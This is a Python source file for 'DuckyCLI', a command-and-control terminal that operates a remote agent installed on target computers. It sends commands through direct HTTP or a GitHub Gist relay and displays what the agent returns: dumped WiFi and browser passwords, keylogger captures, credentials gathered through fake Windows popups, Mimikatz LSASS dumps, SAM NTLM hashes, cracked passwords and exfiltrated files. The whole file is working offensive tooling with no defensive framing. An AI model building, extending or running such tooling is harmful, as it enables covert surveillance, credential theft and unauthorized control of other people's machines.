#!/usr/bin/env python3
"""
DuckyCLI - Interactive Command & Control Terminal for DuckyAgent

Your personal terminal to control any target PC with the DuckyAgent installed.

Usage:
  ducky_cli.py                          Start interactive mode
  ducky_cli.py <target_id> <command>    Run a single command
  ducky_cli.py targets                  List all configured targets
  ducky_cli.py add <id> <url>           Add a new target (URL = agent's HTTP endpoint)

Targets can be:
  - Local agents on your network (http://192.168.x.x:8081/api/)
  - Remote agents via GitHub Gist relay

Commands available per target:
  info, processes, kill <pid>, arp_scan, ports, dns_cache, wifi_passwords,
  browser_creds, keylog start/stop/status/get, clipboard, open_url <url>,
  popup <title> | <message>, ls /path, cat /path, download /path,
  run_script <name>, mimikatz, crack_hash <hash>, john_crack, extract_hashes,
  status, update

Examples:
  ducky_cli.py office-pc info
  ducky_cli.py home-laptop browser_creds
  ducky_cli.py remote-server keylog get 50
"""

import os
import sys
import json
import time
import configparser
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError


# ── Configuration ───────────────────────────────────────────────

CONFIG_DIR = os.path.join(os.environ.get("APPDATA", ""), "DuckyCLI")
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.ini")
TARGETS_FILE = os.path.join(CONFIG_DIR, "targets.json")


def init_config():
    """Initialize config directory and files."""
    os.makedirs(CONFIG_DIR, exist_ok=True)
    if not os.path.exists(TARGETS_FILE):
        with open(TARGETS_FILE, 'w') as f:
            json.dump({}, f)


# ── Target Management ───────────────────────────────────────────

def load_targets():
    """Load all configured targets."""
    init_config()
    try:
        with open(TARGETS_FILE, 'r') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return {}


def save_targets(targets):
    """Save target list to disk."""
    init_config()
    with open(TARGETS_FILE, 'w') as f:
        json.dump(targets, f, indent=2)


def add_target(name, url):
    """Add a new target."""
    targets = load_targets()
    targets[name] = {
        "name": name,
        "url": url,
        "added": time.strftime("%Y-%m-%d %H:%M"),
        "last_seen": None,
    }
    save_targets(targets)
    print(f"  [+] Added target: {name}")


def remove_target(name):
    """Remove a target."""
    targets = load_targets()
    if name in targets:
        del targets[name]
        save_targets(targets)
        print(f"  [-] Removed target: {name}")
    else:
        print(f"  [!] Target not found: {name}")


def list_targets():
    """List all configured targets."""
    targets = load_targets()
    if not targets:
        print("  No targets configured.")
        print("  Add one with: ducky_cli.py add <name> <url>")
        return

    print(f"\n{'='*60}")
    print("  CONFIGURED TARGETS")
    print(f"{'='*60}\n")

    for name, info in targets.items():
        status = "online" if info.get("last_seen") and (time.time() - time.mktime(time.strptime(info["last_seen"], "%Y-%m-%d %H:%M")) < 300) else "offline"
        print(f"  {name:<25} [{status:>7}]  URL: {info['url']}")

    print()


# ── Command Execution ───────────────────────────────────────────

def execute_command(target_name, command):
    """Execute a command on a target and return the response."""
    targets = load_targets()

    if target_name not in targets:
        print(f"  [!] Target '{target_name}' not found.")
        print("  Available targets:")
        for name in targets:
            print(f"      {name}")
        return None

    target = targets[target_name]
    url = target["url"]

    # Determine if this is a local HTTP endpoint or GitHub Gist
    if url.startswith("http://") and "/api/" in url:
        # Local HTTP endpoint - send JSON to /api/command/ path
        api_url = f"{url}command/{command}"
        try:
            req = Request(api_url, headers={"User-Agent": "DuckyCLI/1.0"})
            with urlopen(req, timeout=15) as resp:
                data = json.loads(resp.read().decode('utf-8'))

                # Update last_seen timestamp
                target["last_seen"] = time.strftime("%Y-%m-%d %H:%M")
                targets[target_name] = target
                save_targets(targets)

                return data

        except (URLError, HTTPError, Exception) as e:
            print(f"  [!] Connection failed: {e}")
            return None
    else:
        # GitHub Gist relay - send JSON to command URL, read from response URL
        try:
            cmd_data = json.dumps({"command": command, "args": ""}).encode('utf-8')
            req = Request(
                url,
                data=cmd_data,
                headers={"User-Agent": "DuckyCLI/1.0", "Content-Type": "application/json"},
                method="POST" if not url.endswith('.json') else None,
            )
            urlopen(req, timeout=10)

            # Wait for agent to process (poll for response)
            time.sleep(3)  # Give the agent time to pick up the command

            # Read response from GitHub
            resp_url = url.replace('/command/', '/response/') if '/command/' in url else url + '/response'
            req = Request(resp_url, headers={"User-Agent": "DuckyCLI/1.0"})
            with urlopen(req, timeout=10) as resp:
                data = json.loads(resp.read().decode('utf-8'))

                # Update last_seen
                target["last_seen"] = time.strftime("%Y-%m-%d %H:%M")
                targets[target_name] = target
                save_targets(targets)

                return data.get("response", {}) if isinstance(data, dict) else data

        except Exception as e:
            print(f"  [!] GitHub relay error: {e}")
            return None


def execute_command_via_github(target_name, command):
    """Execute a command via GitHub Gist relay."""
    targets = load_targets()

    if target_name not in targets:
        print(f"  [!] Target '{target_name}' not found.")
        return None

    target = targets[target_name]
    gist_url = target["url"]

    try:
        # Write command to GitHub
        cmd_data = json.dumps({"command": command, "args": ""}).encode('utf-8')
        req = Request(
            gist_url,
            data=cmd_data,
            headers={"User-Agent": "DuckyCLI/1.0", "Content-Type": "application/json"},
            method="POST" if not gist_url.endswith('.json') else None,
        )
        urlopen(req, timeout=10)

        # Wait for agent to process (poll for response)
        time.sleep(3)  # Give the agent time to pick up the command

        # Read response from GitHub
        resp_url = gist_url.replace('/command/', '/response/')
        req = Request(resp_url, headers={"User-Agent": "DuckyCLI/1.0"})
        with urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode('utf-8'))

            # Update last_seen
            target["last_seen"] = time.strftime("%Y-%m-%d %H:%M")
            targets[target_name] = target
            save_targets(targets)

            return data.get("response", {})

    except Exception as e:
        print(f"  [!] GitHub relay error: {e}")
        return None


# ── Output Formatting ───────────────────────────────────────────

def format_response(data):
    """Format and display a command response in a readable way."""
    if not data or "error" in data:
        error = data.get("error", "Unknown error") if data else "No response"
        print(f"\n  [ERROR] {error}\n")
        return

    # ── System Info ───────────────────────────────────────
    if "hostname" in data and "os" in data:
        print("\n" + "=" * 50)
        print("  TARGET SYSTEM INFORMATION")
        print("=" * 50)
        for key, value in data.items():
            label = key.replace("_", " ").title()
            if isinstance(value, str):
                print(f"  {label:<20} : {value}")
            else:
                print(f"  {label:<20} : {json.dumps(value)}")
        print()

    # ── Processes List ────────────────────────────────────
    elif "processes" in data and isinstance(data["processes"], list):
        procs = data["processes"][:100]  # Limit to 100
        print(f"\n  {len(procs)} PROCESSES RUNNING\n")

        if len(procs) > 50:
            print(f"  (showing first 50 of {len(data['processes'])})\n")

        for p in procs[:50]:
            pid = p.get("pid", "?")
            name = p.get("name", "unknown")
            mem = p.get("memory_mb", 0)
            print(f"  {str(pid):>8}  {name:<40}  {mem:>6} MB")

        if len(procs) > 50:
            remaining = len(data["processes"]) - 50
            print(f"\n  ... and {remaining} more processes\n")
        else:
            print()

    # ── Network Recon ─────────────────────────────────────
    elif "output" in data:
        output = data["output"]
        lines = [l for l in output.splitlines() if l.strip()]
        print(f"\n  {len(lines)} LINES OF OUTPUT\n")
        for line in lines[:100]:
            print(f"  {line}")
        if len(lines) > 100:
            remaining = len(lines) - 100
            print(f"\n  ... and {remaining} more lines\n")
        else:
            print()

    # ── Open Ports ────────────────────────────────────────
    elif "open_ports" in data:
        count = data["open_ports"]
        details = data.get("details", "")
        print(f"\n  {count} OPEN PORT(S) DETECTED\n")
        for line in details.splitlines()[:50]:
            print(f"  {line}")
        if len(details.splitlines()) > 50:
            remaining = len(details.splitlines()) - 50
            print(f"\n  ... and {remaining} more lines\n")
        else:
            print()

    # ── WiFi Passwords ────────────────────────────────────
    elif "networks" in data:
        networks = data["networks"]
        print(f"\n  {len(networks)} SAVED WIRELESS NETWORKS\n")
        for i, net in enumerate(networks[:20], 1):
            ssid = net.get("ssid", "?")
            pw = net.get("password", "N/A")
            print(f"  [{i}] {ssid}")
            print(f"      Password: {pw}")
        if len(networks) > 20:
            remaining = len(networks) - 20
            print(f"\n  ... and {remaining} more networks\n")
        else:
            print()

    # ── Browser Credentials ───────────────────────────────
    elif "credentials" in data:
        creds = data["credentials"]
        for browser, info in creds.items():
            count = info.get("count", 0) if isinstance(info, dict) else "?"
            print(f"\n  {browser}: {count} SAVED PASSWORDS\n")

            if "error" not in str(info):
                for cred in (info.get("credentials", []) or [])[:20]:
                    url = cred.get("url", "?")
                    username = cred.get("username", "")
                    password = cred.get("password", "[encrypted]")
                    print(f"  URL:      {url}")
                    print(f"  Username: {username}")
                    print(f"  Password: {password}")
                    print()

    # ── Keylogger Status/Logs ─────────────────────────────
    elif "status" in data and "running" in data.get("status", ""):
        status = data["status"]
        running = data.get("keylogger_running", False) or (isinstance(status, str) and status.lower() == "running")
        print(f"\n  KEYLOGGER STATUS: {'ACTIVE' if running else 'STOPPED'}\n")

        if isinstance(data.get("current_app"), str):
            print(f"  Current app: {data['current_app']}")
        if isinstance(data.get("in_password_field"), bool):
            print(f"  In password field: {data['in_password_field']}")
        if isinstance(data.get("buffer_size"), int):
            print(f"  Memory buffer: {data['buffer_size']} keystrokes\n")

    elif "logs" in data:
        logs = data["logs"]
        lines = [l for l in logs.splitlines() if l.strip()]
        print(f"\n  CAPTURED KEYSTROKES ({len(lines)} lines)\n")
        for line in lines[:100]:
            # Highlight password-like entries
            if "PASSWORD" in line.upper() or "PASSWD" in line.upper():
                print(f"  >>> {line}")
            else:
                print(f"  {line}")
        if len(lines) > 100:
            remaining = len(lines) - 100
            print(f"\n  ... and {remaining} more lines\n")
        else:
            print()

    # ── Popup Captured Credentials ─────────────────────────
    elif "captured" in data:
        creds = data["captured"]
        if isinstance(creds, dict) and "error" not in creds:
            print(f"\n  CREDENTIALS CAPTURED VIA FAKE POPUP\n")
            print(f"  Title:     {creds.get('title', 'N/A')}")
            print(f"  Username:  {creds.get('username', 'N/A')}")
            print(f"  Password:  {creds.get('password', 'N/A')}\n")
        else:
            print(f"\n  [!] Popup error: {creds.get('error', 'Unknown')}\n")

    # ── Clipboard Content ─────────────────────────────────
    elif "content" in data:
        content = data["content"]
        lines = content.splitlines() if '\n' in content else [content]
        print(f"\n  CLIPBOARD CONTENT ({len(content)} chars)\n")
        for line in lines[:20]:
            print(f"  {line}")
        if len(lines) > 20:
            remaining = len(lines) - 20
            print(f"\n  ... and {remaining} more lines\n")
        else:
            print()

    # ── Mimikatz Credentials ──────────────────────────────
    elif "credentials" in data and isinstance(data["credentials"], list):
        creds = data["credentials"]
        status = data.get("status", "")
        print(f"\n  MIKATZ CREDENTIAL DUMP ({len(creds)} credential(s))\n")
        print(f"  Status: {status}\n")

        for i, cred in enumerate(creds, 1):
            username = cred.get("username", "?")
            password = cred.get("password", "")
            hash_val = cred.get("hash", "")
            print(f"  [{i}] CREDENTIAL\n")
            print(f"      Username : {username}")
            if password:
                print(f"      Password : {password}")
            if hash_val:
                print(f"      NTLM Hash: {hash_val[:32]}...")
            print()

        raw = data.get("raw_output", "")
        if raw and len(raw) > 100:
            lines = [l for l in raw.splitlines() if l.strip()]
            print(f"  ... ({len(lines)} total lines of output)\n")

    # ── Hash Cracking Results ─────────────────────────────
    elif "status" in data and ("cracked" in str(data.get("status", "")).lower() or "done" in str(data.get("status", "")).lower()):
        if "cracked" in data and isinstance(data["cracked"], list):
            cracked = data["cracked"]
            print(f"\n  JOHN THE RIPPER - CRACKED {len(cracked)} HASH(ES)\n")
            for item in cracked[:50]:
                h = item.get("hash", "?")[:32] + "..."
                pw = item.get("password", "")
                print(f"  Hash:   {h}")
                print(f"  Pass:   {pw}\n")
        elif "hashes" in data and isinstance(data["extracted"], list):
            hashes = data["hashes"]
            print(f"\n  EXTRACTED {len(hashes)} NTLM HASH(ES) FROM SAM\n")
            for h in hashes[:20]:
                parts = h.split(":")
                if len(parts) >= 2:
                    user = parts[0]
                    hash_val = parts[1][:32] + "..."
                    print(f"  {user}:{hash_val}")
        else:
            output = data.get("raw_output", "")
            lines = [l for l in output.splitlines() if l.strip()]
            print(f"\n  JOHN OUTPUT ({len(lines)} lines)\n")
            for line in lines[:100]:
                print(f"  {line}")

    # ── File Listing ──────────────────────────────────────
    elif "files" in data:
        files = data["files"]
        print(f"\n  FILES IN DIRECTORY ({len(files)} items)\n")
        for f in files[:100]:
            name = f.get("name", "?")
            is_dir = "[DIR]" if f.get("is_dir") else "     "
            size = ""
            if not f.get("is_dir") and f.get("size") is not None:
                size = f"  ({f['size']} bytes)"
            print(f"  {is_dir} {name}{size}")
        if len(files) > 100:
            remaining = len(files) - 100
            print(f"\n  ... and {remaining} more items\n")
        else:
            print()

    # ── File Content (cat/download) ───────────────────────
    elif "content" in data and isinstance(data["content"], str):
        content = data["content"]
        lines = [l for l in content.splitlines()]
        print(f"\n  FILE CONTENT ({len(lines)} lines)\n")
        for line in lines[:200]:
            print(f"  {line}")
        if len(lines) > 200:
            remaining = len(lines) - 200
            print(f"\n  ... and {remaining} more lines\n")
        else:
            print()

    # ── Downloaded File (base64) ──────────────────────────
    elif "file" in data and "content_base64" in data:
        import base64
        try:
            decoded = base64.b64decode(data["content_base64"])
            filename = data["file"]
            dest = os.path.join(os.getcwd(), filename)

            with open(dest, 'wb') as f:
                f.write(decoded)

            print(f"\n  [+] Downloaded '{filename}' to {dest}\n")
        except Exception as e:
            print(f"\n  [!] Failed to decode file: {e}\n")

    # ── Script Info ───────────────────────────────────────
    elif "script" in data and "commands" in data:
        script = data["script"]
        commands = data["commands"]
        print(f"\n  SCRIPT: {script} ({len(commands)} commands)\n")
        for cmd in commands[:50]:
            print(f"    {cmd}")
        if len(commands) > 50:
            remaining = len(commands) - 50
            print(f"\n  ... and {remaining} more\n")
        else:
            print()

    # ── Status/Health ─────────────────────────────────────
    elif "agent_version" in data or "uptime_seconds" in data:
        print("\n  AGENT STATUS\n")
        for key, value in data.items():
            label = key.replace("_", " ").title()
            if isinstance(value, (int, float)):
                if key == "uptime_seconds":
                    hours = int(value / 3600)
                    mins = int((value % 3600) / 60)
                    print(f"  {label:<25} : {hours}h {mins}m")
                else:
                    print(f"  {label:<25} : {value}")
            elif isinstance(value, bool):
                print(f"  {label:<25} : {'YES' if value else 'NO'}")
            else:
                print(f"  {label:<25} : {value}")
        print()

    # ── Generic JSON response ─────────────────────────────
    elif isinstance(data, dict):
        print("\n  RAW RESPONSE\n")
        for key, value in data.items():
            if isinstance(value, (list, dict)):
                print(f"  {key}: ({len(value)} items)")
            else:
                display = str(value)[:200]
                print(f"  {key:<30} : {display}")
        print()

    # ── Unknown format ────────────────────────────────────
    else:
        print(f"\n  [!] Unexpected response format\n")


# ── Interactive Menu System ─────────────────────────────────────

def show_main_menu():
    """Display the main menu and return user's choice."""
    print("\n" + "=" * 50)
    print("  DUCKYCLI - COMMAND & CONTROL TERMINAL")
    print("=" * 50)
    print()
    print("  [1] List targets")
    print("  [2] Add a new target")
    print("  [3] Remove a target")
    print("  [4] Interactive command mode")
    print("  [5] Run a single command")
    print()
    print("  [0] Exit")
    print()


def interactive_mode(target_name):
    """Enter interactive command mode for a specific target."""
    print(f"\n{'='*50}")
    print(f"  INTERACTIVE MODE: {target_name}")
    print(f"  Type 'help' for available commands")
    print(f"  Type 'back' to return to main menu")
    print(f"{'='*50}\n")

    while True:
        try:
            cmd = input(f"  [{target_name}] > ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n  [!] Exiting interactive mode.")
            break

        if not cmd or cmd.lower() == 'back' or cmd.lower() == 'quit':
            break

        if cmd.lower() == 'help':
            show_command_help()
            continue

        # Execute the command
        result = execute_command(target_name, cmd)
        if result is not None:
            format_response(result)


def run_single_command(target_name, command):
    """Run a single command and display the result."""
    print(f"\n  Sending '{command}' to {target_name}...")
    result = execute_command(target_name, command)
    if result is not None:
        format_response(result)


def show_command_help():
    """Display available commands for each category."""
    print("\n" + "=" * 50)
    print("  AVAILABLE COMMANDS")
    print("=" * 50)
    print()

    categories = {
        "SYSTEM INFO": [
            "info              - OS, hostname, IP address",
            "status            - Agent health and status",
            "update            - Update agent to latest version from GitHub",
        ],
        "PROCESSES": [
            "processes         - List all running processes",
            "kill <pid>        - Terminate a process",
        ],
        "NETWORK RECON": [
            "arp_scan          - Scan local network for devices",
            "ports             - Show open TCP ports",
            "dns_cache         - Display DNS cache entries",
            "wifi_passwords    - Dump all saved WiFi credentials",
        ],
        "BROWSER CREDENTIALS": [
            "browser_creds     - Extract Chrome/Edge saved passwords",
            "clipboard         - Get current clipboard contents",
        ],
        "KEYLOGGER": [
            "keylog start      - Start capturing keystrokes",
            "keylog stop       - Stop keylogging",
            "keylog status     - Check keylogger state",
            "keylog get [n]    - Retrieve captured keystrokes (last n lines)",
        ],
        "BROWSER": [
            "open_url <url>    - Open a URL in the browser",
            "popup <title> | <message>  - Show fake Windows popup",
        ],
        "CREDENTIAL DUMPING": [
            "mimikatz          - Extract credentials from memory (LSASS)",
            "extract_hashes    - Dump NTLM hashes from SAM database",
        ],
        "HASH CRACKING": [
            "crack_hash <h>    - Crack an NTLM hash",
            "john_crack         - Run John the Ripper on extracted hashes",
        ],
        "FILES": [
            "ls /path          - List files in a directory",
            "cat /path         - Read file contents",
            "download /path    - Download a file from target",
            "run_script <name> - Execute a .duckyscript on the agent",
        ],
    }

    for category, commands in categories.items():
        print(f"  {category}:")
        for cmd in commands:
            print(f"      {cmd}")
        print()


# ── Main Entry Point ────────────────────────────────────────────

def main():
    args = sys.argv[1:]

    # Handle subcommands
    if len(args) >= 2 and args[0] == "targets":
        list_targets()
        return

    if len(args) >= 3 and args[0] == "add":
        add_target(args[1], args[2])
        return

    if len(args) >= 2 and args[0] == "remove" or (len(args) >= 2 and args[0] == "rm"):
        remove_target(args[1])
        return

    # Single command: ducky_cli.py <target> <command>
    if len(args) >= 2:
        target = args[0]
        command = " ".join(args[1:])
        run_single_command(target, command)
        return

    # Interactive mode (no arguments)
    init_config()

    while True:
        show_main_menu()
        try:
            choice = input("  Select option: ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n  [!] Goodbye.")
            break

        if choice == "0" or not choice:
            print("  [!] Goodbye.")
            break

        elif choice == "1":
            list_targets()

        elif choice == "2":
            name = input("  Target name (e.g., office-pc): ").strip()
            url = input("  URL (http://IP:8081/api/ or GitHub gist): ").strip()
            if name and url:
                add_target(name, url)

        elif choice == "3":
            targets = load_targets()
            if not targets:
                print("  No targets to remove.")
                continue
            print("\n  Available targets:")
            for t in targets:
                print(f"      {t}")
            name = input("\n  Target to remove: ").strip()
            remove_target(name)

        elif choice == "4":
            targets = load_targets()
            if not targets:
                print("  No targets configured. Add one first.")
                continue

            print("\n  Available targets:")
            for t in targets:
                status = "online" if targets[t].get("last_seen") else "offline"
                print(f"      [{status:>7}] {t}")

            name = input("\n  Select target: ").strip()
            if name in targets:
                interactive_mode(name)
            else:
                print("  [!] Invalid target.")

        elif choice == "5":
            targets = load_targets()
            if not targets:
                print("  No targets configured. Add one first.")
                continue

            name = input("  Target name: ").strip()
            command = input("  Command: ").strip()
            if name in targets and command:
                run_single_command(name, command)
            else:
                print("  [!] Invalid target or empty command.")

        else:
            print("  [!] Invalid option. Use 0-5.\n")


if __name__ == '__main__':
    main()
